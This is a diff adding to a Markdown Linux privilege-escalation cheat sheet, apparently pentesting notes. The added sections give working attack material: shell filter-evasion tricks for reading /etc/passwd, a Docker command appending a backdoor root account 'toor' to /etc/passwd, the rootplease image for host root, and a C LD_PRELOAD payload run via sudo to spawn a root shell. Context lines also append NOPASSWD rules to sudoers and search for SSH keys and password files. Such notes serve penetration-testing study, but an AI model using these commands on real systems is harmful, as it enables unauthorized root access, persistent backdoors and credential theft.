@@ -1,13 +1,25 @@
+# Linux
+
 ### System Information
 
 #### Automated Enumeration tool
 
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 - [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 
 ```bash
+# 1. LSE
+wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
+# Show interesting results.
+./lse.sh -l 1
+
+
 ./LinEnum.sh
+
 ```
+
+*Note that I didn't include "unix-privesc-check" has it has not been updated since 3 years*
 
 #### Distribution
 
@@ -26,7 +38,8 @@ lsb_release -all # Prints certain LSB (Linux Standard Base) and Distribution inf
 
 #### Kernel
 
-The kernel is the core of the operating system and is a valuable place to look for exploits
+The kernel is the core of the operating system and is a valuable place to look for exploits.
+
 ```bash
 at /proc/version # This file specifies the version of the Linux kernel, the version of gcc used to compile the kernel, and the time of kernel compilation.
 uname -a # Print all system information
@@ -42,7 +55,7 @@ modinfo -d MODULE # Display information about a Linux Kernel module
 
 - *Architecture*: Ensure that unused kernel modules are removed from the system, or at least blacklisted (cc [Blacllist parameter](https://man7.org/linux/man-pages/man5/modprobe.d.5.html))
 - *Architecture*: Ensure that unused old kernel versions are removed from the system.
-- *Architecture*: Configure kernel security using tools like [sysctl]() 
+- *Architecture*: Configure kernel security using tools like [sysctl](https://linux.die.net/man/8/sysctl)
 - *Architecture*: Configure boot parameters that disables potential attack vector
 - *Architecture*: Understand the difference between a "Stable" and a "Long Term Support" kernel version and choose the options that fits the best your needs.
 
@@ -164,7 +177,6 @@ grep "net\.ipv4\.conf\.default\.accept_source_route" /etc/sysctl.conf/etc/sysctl
 grep "net\.ipv6\.conf\.all\.accept_source_route" /etc/sysctl.conf/etc/sysctl.d/*
 grep "net\.ipv6\.conf\.default\.accept_source_route" /etc/sysctl.conf/etc/sysctl.d/*
 ```
-
 
 Also check if tcpdump is available, you could maybe sniff some interesting things.
 
@@ -330,7 +342,7 @@ find / -name ssh_host_rsa_key* -print 2> /dev/null
 find / -name ssh_host_key* -print 2> /dev/null
 find / -name id_rsa* -print 2>/dev/null
 find / -name authorized_keys -print 2> /dev/null
-cat /etc/security/opasswd
+cat /etc/security/opasswd 
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Search for password in PHP file (cc Joomla)
 grep "^\s*password" /boot/grub/menu.lst
 grep "^\s*GRUB2_PASSWORD" /boot/grub2/user.cfg
@@ -582,7 +594,6 @@ find /etc -name squid.conf -print 2>/dev/null
 - **/etc/cups/cupsd.conf**: You could found credentials or others usefull information in it
 - **/etc/printer.conf**: You could found credentials or others usefull information in it
 
-
 ###### *If you don't know, now you know: **[NFS Root Squashing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)**
 
 Root squash is a technique to void privilege escalation on the client machine via suid executables Setuid. Without root squash, an attacker can generate suid binaries on the server that are executed as root on other client, even if the client user does not have superuser privileges.
@@ -691,6 +702,36 @@ tmux -S /tmp/dev_sess attach -t 0
 ```
 
 ### Defense Enumeration
+
+#### Bash
+
+```bash
+# Bash substitudes
+/usr/bin/p?ng
+/usr/bin/who*mi
+
+# Concatenation
+'p'i'n'g
+"w"h"o"a"m"i
+\u\n\a\m\e \-\a
+
+# Uninitialized variables
+p${u}i${u}n${u}g
+cat$u /etc$u/passwd$u 
+
+# IFS
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+
+# New lines
+p\
+i\
+n\
+g
+
+# Decimal IPs
+127.0.0.1 == 2130706433
+```
 
 #### IPTable
 
@@ -890,7 +931,7 @@ The group kmem is able to read the content of the system memory, potentially dis
 
 ##### Disk
 
-The group **disk** can be very dangerous, since hard drives in /dev/sd\* and /dev/hd\* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. 
+The group **disk** can be very dangerous, since hard drives in /dev/sd\* and /dev/hd\* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges.
 
 You can find use that vulnerability as showed below where we use a filesystem debugger to get SSH keys and the /etc/shadow content.
 
@@ -993,6 +1034,19 @@ lxc exec thomasd /bin/sh
 
 ##### Docker group
 
+Mount the filesystem in a bash container, allowing you to edit the /etc/passwd as root, then add a backdoor account toor:password.
+
+```bash
+docker run -it --rm -v $PWD:/mnt bash
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+```
+
+[rootplease](https://hub.docker.com/r/chrisfosterelli/rootplease/) is a docker image that allows you to become root on unsecure machines
+
+```bash
+docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
+```
+
 ###### Mount technique
 
 ```bash
@@ -1038,6 +1092,26 @@ sudo -l # Check if they are scripts than once launch, they are run as root
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
 
+If LD_PRELOAD is explicitly defined in the sudoers file, compile the following C code with *gcc -fPIC -shared -o shell.so shell.c -nostartfiles*
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/sh");
+}
+```
+
+Then execute this payload like this
+
+```bash
+sudo LD_PRELOAD=/tmp/shell.so echo "Thomas"
+```
+
 #### tty_tickets,  env_reset & timestamp_timeout
 
 > / / / To finish
@@ -1065,7 +1139,7 @@ sudo sed -i 'timestamp_timeout=-1/' /etc/sudoers
 
 For more information about that technique refer to [T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)
 
-https://github.com/7CA700B53CA3/atomic-red-team-pre-subtechniques/blob/d591d963b6e88caec70d33f388299107d05c7a73/atomics/T1206/T1206.md
+<https://github.com/7CA700B53CA3/atomic-red-team-pre-subtechniques/blob/d591d963b6e88caec70d33f388299107d05c7a73/atomics/T1206/T1206.md>
 
 ### Sudo (Single-user mode)
 
@@ -1403,7 +1477,7 @@ thomas@home# capsh --decode=000001ffffffffff
 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
 ```
 
-*Note that on some systems, getcap is not available for all users* 
+*Note that on some systems, getcap is not available for all users*
 
 ###### *If you don't know, now you know: [Capabilities](https://linux.die.net/man/7/capabilities)*
 
@@ -1621,10 +1695,10 @@ Note that normally:
 - Restricted Kernel data must not leave the kernel memory.
 
 > / / / To Finish / / /  
-https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library
-https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
-https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/
+<https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library>
+<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library>
+<https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>
+<https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/>
 
 
 #### Others
@@ -1652,11 +1726,11 @@ Array
 
 #### References
 
-- Abusing NET-SNMP-EXTEND-MIB: https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/
-- LD_PRELOAD: https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/
-https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
-https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
-- CAP_SYS_PTRACE: https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
-- NFS Root Squashing: https://haiderm.com/category/priviledge-escalation/
-- tmux: https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
-- https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html
+- Abusing NET-SNMP-EXTEND-MIB: <https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/>
+- LD_PRELOAD: <https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/>
+<https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/>
+<https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/>
+- CAP_SYS_PTRACE: <https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc>
+- NFS Root Squashing: <https://haiderm.com/category/priviledge-escalation/>
+- tmux: <https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions>
+- <https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html>
